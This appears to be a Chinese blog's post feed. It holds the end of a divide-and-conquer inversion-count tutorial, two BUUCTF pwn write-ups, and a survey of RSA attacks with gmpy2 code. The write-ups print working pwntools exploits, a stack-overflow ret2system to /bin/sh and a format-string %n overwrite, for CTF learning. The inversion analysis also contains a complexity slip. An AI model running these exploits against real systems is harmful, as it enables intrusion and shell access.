<p>此时逆序数<code>cnt</code>要加上<code>n</code>.</p>
<ol start="2">
<li>左边的指针要往后移动，即指向<code>a[i+1]</code>,那么就会有两种情况：</li>
</ol>
<ul>
<li>①<code>a[i+1]&gt;b[j]</code>:这个很好解决，继续回到步骤1即可。</li>
<li>②<code>a[i+1]&lt;b[j]</code>:由于<code>b[j]</code>的左边都是小于<code>a[i]</code>，即存在这样的关系：<code>b[j]&gt;a[i+1]&gt;a[i]&gt;b[j-1]</code>，故此时由<code>a[i+1]</code>作为第一个数字组成的跨越左右两部分的数对（或者说序偶）中，逆序数也是<code>n</code>，此时逆序数<code>cnt</code>要加上<code>n</code>.下一步左边的指针要往后移动，继续步骤②，直到左边的指针指向元素比右边指针指向的大，回到步骤1，假若左边的指针先到了左半部分的最右边，则到步骤3。</li>
</ul>
<ol start="3">
<li>此时要么左半部分先遍历完，要么右半部分先遍历完，假如是左边先遍历完，则说明此时“跨越左右两半部分的逆序数”统计完成，即<code>cnt</code>是正确的值，跳步骤4.如果是右半部分先遍历完成，则说明左边尚未遍历完成的数字都要比右半部分的数字大，根据这个条件计算逆序数后，转步骤4.</li>
<li>将<code>leftCnt + rightCnt + cnt</code>作为原问题的解。</li>
</ol>
<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>下面进行时间复杂度分析，我们子问题个数是2（分别递归求解左右两个部分），每个子问题的规模是原来的一半，合并子问题花费$O(n\log n)$。</p>
<p>则：<br>$$<br>T(n)=2T(\frac{n}{2} )+O(n \log n)<br>$$<br>根据主定理，得<br>$$<br>T(n)=O(n \log n)<br>$$</p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">100000</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">list</span>[LEN], length;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">reverseOrderNumber</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (left + <span class="number">1</span> == right)<span class="keyword">return</span> <span class="built_in">list</span>[left] &gt; <span class="built_in">list</span>[right];</span><br><span class="line">    <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 分别求解子问题</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> leftCnt  = reverseOrderNumber(left, mid);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> rightCnt = reverseOrderNumber(mid + <span class="number">1</span>, right);</span><br><span class="line">    <span class="comment">// 排序左右两半部分</span></span><br><span class="line">    <span class="keyword">int</span> *l1 = <span class="built_in">list</span> + left, *r1 = <span class="built_in">list</span> + mid - left + <span class="number">1</span> + left;</span><br><span class="line">    sort(l1, r1);</span><br><span class="line">    sort(r1, <span class="built_in">list</span> + right + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算跨左右部分的逆序数</span></span><br><span class="line">    <span class="keyword">int</span> i = left, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= right)&#123;</span><br><span class="line">        <span class="comment">// 在右边寻找第一个大于 a[i] 的元素</span></span><br><span class="line">        <span class="keyword">while</span>(j &lt;= right &amp;&amp; <span class="built_in">list</span>[i] &gt; <span class="built_in">list</span>[j])j++;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; right)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid &amp;&amp; <span class="built_in">list</span>[i] &lt; <span class="built_in">list</span>[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            cnt += j - <span class="number">1</span> - mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左边尚未遍历完的数字都要比右半部分的大</span></span><br><span class="line">    <span class="keyword">if</span>(j &gt; right) cnt += (mid - i + <span class="number">1</span>) * (right - mid);</span><br><span class="line">    <span class="comment">// 合并子问题</span></span><br><span class="line">    <span class="keyword">return</span> leftCnt + rightCnt + cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// printf("input the length:\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;length);</span><br><span class="line">    <span class="comment">// printf("input the value:\n");</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;<span class="built_in">list</span>[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, reverseOrderNumber(<span class="number">0</span>, length - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 3 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 9 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">5 9 12 16 2 3 13 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">7 4 3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">2 6 3 4 5 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<hr>
<p>实际上排序过程也可以使用归并排序，并且排序过程就可以计算逆序数了，不过归并排序过程要辅助空间，这里就没有采用。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-jarvisoj-level2题解</title>
    <url>/2022/08/29/BUUCTF-jarvisoj-level2%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>考点：栈溢出漏洞。</p>
<p>本文需要你了解栈溢出漏洞相关知识，如果尚未了解，可移步至<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank" rel="noopener">【ctf-wiki】</a>学习</p>
<p>下载文件以后，查看文件信息：<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file level2</span></span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure>

<p>查看保护信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file=level2</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No    0               1               level2</span><br></pre></td></tr></table></figure>

<p>没有发现<code>canary</code>，说明我们有机会溢出，为什么说有机会呢？万一我们都无法利用<code>puts</code>函数呢，又或者输入长度被限制了呢？</p>
<p><code>NX</code>也开启了，那程序就无法将栈上的数据作为指令来运行。</p>
<p>继续运行看看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">yalexin</span><br><span class="line">Hello World!</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">zsh: segmentation fault  ./level2</span><br></pre></td></tr></table></figure>

<p>看来可能是溢出了。</p>
<p>继续使用IDA32反编译看看，<code>main</code>函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进去第一个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，<code>buf</code>的长度是<code>0x88h</code>，我们能够输入的长度是<code>0x100</code>，满足溢出条件！</p>
<p>继续观察，看看有没有可以利用的函数：</p>
<p><img src="https://cdn.yalexin.top/image-20220829233139496.png" alt="image-20220829233139496"></p>
<p>我们花了2.12s发现了一个调用了<code>system</code>函数的函数，那么我们直接通过溢出，设置返回地址到该地址，然后传递<code>/bin/sh</code>作为参数，获取<code>shell</code>即可。</p>
<p>继续看看有没有可以利用的字符串：</p>
<p><img src="https://cdn.yalexin.top/image-20220829233607425.png" alt="image-20220829233607425"></p>
<p>继续花了3.02s发现了<code>/bin/sh</code>的地址。</p>
<p>因此我们可以构造这样子的<code>payload</code>，使得执行完<code>read()</code>函数后，程序直接跳转到<code>_system()</code>函数，进而执行<code>system</code>函数。</p>
<p>本程序是32程序，gcc编译的32位程序，遵循这样的函数调用准则：</p>
<ol>
<li>调用方将实参保存到栈中</li>
<li>被调方使用栈顶偏移量的方式访问保存到栈中的变量</li>
<li>程序刚刚进入函数时候，也就是将要执行该函数的第一条指令时，栈顶保存的是执行完该被调函数后的返回地址，栈顶的下面（我们规定上面是低地址，下面是高地址）依次保存着该调用函数用到的形参，注意分别对应着从<strong>右到左</strong>的参数</li>
</ol>
<p>那么本题的<code>payload</code>就应该长这样子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br></pre></td></tr></table></figure>

<p><code>padding * b&#39;a&#39;</code>理论上可以随意跟上一个地址，该地址将来成为函数调用返回后的栈底地址，这里我设置了一个通过在<code>gdb</code>环境下看到的栈开始的地址。</p>
<p>完整payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27312</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b'Input:\n'</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p>本题难度应该不大，可是为什么在BUUCTF中，为什么通过该题的人数竟然比一些我认为比较难的题目的还少？？</p>
<p><img src="https://cdn.yalexin.top/image-20220830000538728.png" alt="image-20220830000538728"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-[第五空间2019 决赛]PWN5题解</title>
    <url>/2022/08/29/BUUCTF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>考点：格式化字符串漏洞-覆盖指定地址为小数字。</p>
<p>本文需要你了解字符串漏洞相关知识，如果尚未了解，可移步至<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/" target="_blank" rel="noopener">【ctf-wiki】</a>学习</p>
<p>下载文件以后，查看文件信息：<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file pwn           </span></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped</span><br></pre></td></tr></table></figure>

<p>查看保护信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               pwn</span><br></pre></td></tr></table></figure>

<p><strong>Canary</strong>出现了，那栈溢出就使不得了，<strong>NX</strong>开启意味着栈中数据没有执行权限，真可谓重重难关。</p>
<p>然后运行一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn           </span></span><br><span class="line">your name:yalexin</span><br><span class="line">Hello,yalexin</span><br><span class="line">your passwd:123456</span><br><span class="line">fail</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�your passwd:fail</span><br></pre></td></tr></table></figure>

<p>买看出啥端倪，那就继续使用IDA32位程序看一下：</p>
<p>关键代码和注释如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">v1 = time(<span class="number">0</span>);</span><br><span class="line">srand(v1);</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 使用种子以后，产生随机数，写到unk_804C044中</span></span><br><span class="line"><span class="built_in">read</span>(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line"><span class="comment">// buf到栈底的长度有0x70h，但是我们只能输入 0x63h，也就是我们无法在这里溢出</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello,"</span>);</span><br><span class="line"><span class="comment">// 看到了这样子使用printf函数，立即推格式化字符串漏洞！</span></span><br><span class="line"><span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line"><span class="comment">// 同理，在这里我们也无法在这里溢出</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="comment">// 我们可以通过格式化字符串漏洞把这个数据泄露出来，然后再输入该值，也可以直接修改该值</span></span><br><span class="line"><span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>由于我们的随机数变量<code>unk_804C044</code>是存储在<code>bss</code>段，并不在栈上，我们无法得知该值，那我们可以换个思路，直接修改该变量的值。</p>
<p>在此之前，我们要先确定我们输入的字符串偏移量，即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:abcd%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p 11:%p</span><br><span class="line">Hello,abcd0xffa91108 2:0x63 3:(nil) 4:0xf7f55b30 5:0x3 6:0xf7f1b420 7:0x1 8:(nil) 9:0x1 10:0x64636261 11:0x32207025</span><br></pre></td></tr></table></figure>

<p>可以看到该字符串在<code>printf</code>函数中的位置相较于第一个参数的偏移量是10。</p>
<p>通过IDA我们可以知道随机变量存放的地址为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 unk_804C044     db    ? ;               ; DATA XREF: main+77↑o</span><br></pre></td></tr></table></figure>

<p>下面我们就可以着手通过下面的方式修改指定内存的值了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr%10$n</span><br></pre></td></tr></table></figure>

<p><code>%10$n</code>是说将已经输出的个数写入<code>addr</code>所指向的地址。我们的地址是32位的，即4个字节，那么我们此时已经将指定地址修改为4了。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">''</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">random_var_addr = <span class="number">0x0804c044</span></span><br><span class="line"></span><br><span class="line">payload = p32(random_var_addr) + <span class="string">b'%10$n'</span></span><br><span class="line">hacker.sendlineafter(<span class="string">'your name:'</span>, payload)</span><br><span class="line">line = hacker.recvuntil(<span class="string">'your passwd:'</span>)</span><br><span class="line">hacker.sendline(<span class="string">b'4'</span>)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p><code>pwn</code>入门是真的难！！<del>即使我已经学了编译原理、汇编和组成原理</del>（当然可能也是因为没学好）。</p>
<p>除此之外，IDA反编译出来的代码只能作为参考，切记奉为圭臬，之前刚刚学习的时候，遇到反汇编出来的代码中，定义变量的顺序是反的，变量类型也出错，搞得我郁闷了好几天，还好同班的大佬指出了我的错误。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA的常见攻击</title>
    <url>/2022/08/15/RSA%E7%9A%84%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>本文参考自文章<a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">【从0到1：CTFer成长之路-第7章】</a></p>
<p>上文我们介绍了RSA算法原理，只要我们设置得当，我们有足够多的理由相信我们的RSA系统是安全的，但是粗心的我们，能否禁得住黑客的攻城掠池？下面介绍一些RSA的常见攻击。<a id="more"></a></p>
<h2 id="1-因式分解"><a href="#1-因式分解" class="headerlink" title="1.因式分解"></a>1.因式分解</h2><p>产生公钥和私钥的时候，我们用到了p，q，e，我们对外公布的是p和q的乘积以及e。如果我们选用的p和q太小，很容易就被很多工具将二者的乘积进行因式分解，从而获得了p和q。</p>
<p>有很多在线工具可以将大数进行因式分解，也有一些开源工具，这里以<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">Yafu</a>为例,对于阿珍的公钥&lt;n,e&gt;=&lt;16422644908304291,65537&gt;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\HackTools\yafu-1.34&gt;yafu-x64.exe</span><br><span class="line">factor(16422644908304291)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fac: factoring 16422644908304291</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line">fmt: 1000000 iterations</span><br><span class="line">Total factoring time = 0.0058 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P9 = 134235139</span><br><span class="line">P9 = 122342369</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></table></figure>

<p>继续使用<code>python</code>的<code>Gmpy2</code>库可以很容易求逆元：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p, q, e = <span class="number">134235139</span>, <span class="number">122342369</span>, <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 求 e mod phi 的逆元</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">print(d)</span><br><span class="line"><span class="comment"># 8237257961022977</span></span><br></pre></td></tr></table></figure>

<p>此外，如果<code>p</code>和<code>q</code>的差距较小，根据下面的式子：<br>$$<br>(\frac{p+q}{2} )^2-pq=(\frac{p-q}{2} )^2<br>$$<br>直接暴力枚举<code>p</code>和<code>q</code>的差值，寻找<code>p</code>和<code>q</code></p>
<h2 id="2-低加密指数小明文攻击"><a href="#2-低加密指数小明文攻击" class="headerlink" title="2.低加密指数小明文攻击"></a>2.低加密指数小明文攻击</h2><p>如果阿强想要发送的数据很短，很简单，即明文<code>m</code>编码后，对应数学上，其数值很小，加上其公钥中的<code>e</code>很小，计算<code>m^e</code>的值并没有超过<code>n</code>，那么我们想要得到明文，直接将密文开<code>e</code>次方即可。</p>
<p>此外，如果密文<code>c</code>虽然大于<code>n</code>，但是并不是太大，由于：<br>$$<br>c\equiv m^e \pmod{n}<br>$$<br>即存在整数k，使得：<br>$$<br>c+kn=m^e<br>$$<br>我们可以直接暴力枚举<code>k</code>，然后将其开<code>e</code>次方，如果可以开得尽，则说明找到了明文<code>m</code>。</p>
<h2 id="3-共模攻击"><a href="#3-共模攻击" class="headerlink" title="3.共模攻击"></a>3.共模攻击</h2><p>如果阿珍使用了相同的<code>n</code>，不同的指数<code>e1</code>，<code>e2</code>,同时这两个指数互素，并且得到了对同一组明文加密后的密文<code>c1</code>和<code>c2</code>，在不获取私钥的情况下也能将明文解来，原理如下：</p>
<p>设：<br>$$<br>c_1=m^{e_1}\pmod{n}<br>$$<br>和<br>$$<br>c_2=m^{e_2}\pmod{n}<br>$$<br>由于<code>e1</code>和<code>e2</code>互素，存在整数x和y，使得：<br>$$<br>xe_1+ye_2=1<br>$$<br>x和y可以通过<a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414" target="_blank" rel="noopener">扩展欧几里得算法</a>求解出来。</p>
<p>进一步有：<br>$$<br>c_{1}^{x}c_{2}^{y} \pmod{n}=m^{xe_1}m^{ye_2}\pmod{n}=m^1\pmod{n}=m<br>$$<br>即可获得明文。</p>
<h2 id="4-广播攻击"><a href="#4-广播攻击" class="headerlink" title="4.广播攻击"></a>4.广播攻击</h2><p>对于相同的明文，如果阿强使用了相同的明文<code>m</code>，相同的指数<code>e</code>，但是不同的<code>n1</code>,<code>n2</code>,<code>n3</code>…<code>nh</code>(h&gt;=e)，同时暴露了对应的每个密文，可以使用中国剩余定理解出明文<code>m</code>。</p>
<p>设：<br>$$<br>\left{\begin{matrix}<br>c_1=m^e\pmod{n_1}<br> \<br>c_2=m^e\pmod{n_2}<br>\<br>…<br>\<br>c_h=m^e\pmod{n_h}<br>\end{matrix}\right.<br>$$<br>借助<a href="https://baike.sogou.com/v1853008.htm?fromTitle=%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">中国剩余定理</a>,假设<code>ni</code>两两互素，令：<br>$$<br>N=\prod_{i=1}^{h} n_i<br>$$</p>
<p>$$<br>N_i=\frac{N}{n_i}<br>$$</p>
<p>则上述同余方程组有唯一解：<br>$$<br>X=m^e\equiv\sum_{i=1}^{h} c_iN_iy_i \pmod{N}<br>$$<br>其中：<br>$$<br>N_iy_i\equiv1\pmod{n_i}<br>$$</p>
<p>例如，假设张三想要发送消息给甲乙丙三个人，张三手上也有对应的三个公钥<code>&lt;205,3&gt;&lt;187,3&gt;&lt;667,3&gt;</code>，他想发送的消息<code>m=10</code>，加密后的密文分别是180，65，333</p>
<p>这三组公钥和密文在传输过程中被李四截取，他立马写下脚本进行窃取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中国剩余定理的代码来自rosettacode Wiki</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(c,n)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ni 的乘积,N=n1*n2*n3</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x,y:x*y,n)</span><br><span class="line">    <span class="comment"># zip()将对象打包成元组</span></span><br><span class="line">    <span class="keyword">for</span> n_i, c_i <span class="keyword">in</span> zip(n,c):</span><br><span class="line">        <span class="comment"># Ni=N/ni</span></span><br><span class="line">        N_i = N // n_i</span><br><span class="line">        <span class="comment"># Ni y == 1 % ni 求逆元</span></span><br><span class="line">        y = gmpy2.invert(N_i,n_i)</span><br><span class="line">        sum += c_i * N_i * y</span><br><span class="line">    <span class="keyword">return</span> sum % N</span><br><span class="line">n1, n2, n3 = <span class="number">205</span>, <span class="number">187</span>, <span class="number">667</span></span><br><span class="line">c1, c2, c3 = <span class="number">180</span>, <span class="number">65</span>, <span class="number">333</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">x = CRT(c,n)</span><br><span class="line"><span class="comment"># 将x开e次方</span></span><br><span class="line">m = gmpy2.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>



<h2 id="5-低解密指数攻击"><a href="#5-低解密指数攻击" class="headerlink" title="5.低解密指数攻击"></a>5.低解密指数攻击</h2><p>1989年，Michael J.Wiener发表了<a href="https://ieeexplore.ieee.org/abstract/document/54902" target="_blank" rel="noopener">Cryptanalysis of Short RSA Secret Exponents</a>文章，提出了一种针对解密指数<code>d</code>较低时对于RSA的攻击方法，该方法基于连分数,设：<br>$$<br>ed=1+k \varphi(n)<br>$$<br>当q&lt;p&lt;2q时，若满足：<br>$$<br>d&lt;\frac{1}{3}  n ^{\frac{1}{4}}<br>$$<br>则通过搜索连分数e/N的收敛，可以有效率地找到k/d，从而恢复正确的d。</p>
<p>目前，对于此种攻击已有完备的实现，在<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">GitHub</a>可以找到完整可用的攻击代码</p>
